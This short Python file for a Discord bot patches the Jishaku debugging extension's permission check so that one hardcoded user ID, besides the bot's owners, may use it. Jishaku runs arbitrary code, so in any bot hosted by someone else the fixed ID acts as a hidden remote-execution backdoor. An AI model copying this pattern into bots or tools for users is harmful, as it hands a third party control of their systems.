from jishaku import Jishaku, JishakuBase
from discord.ext.commands import Context

DEVS = [232574143818760192]

async def cog_check_patch(self: JishakuBase, ctx: Context):
    if ctx.author.id in DEVS: return True
    owners = ctx.bot.owner_ids if ctx.bot.owner_ids else [ctx.bot.owner_id]
    if ctx.author.id in owners: return True
    return False

Jishaku.cog_check = cog_check_patch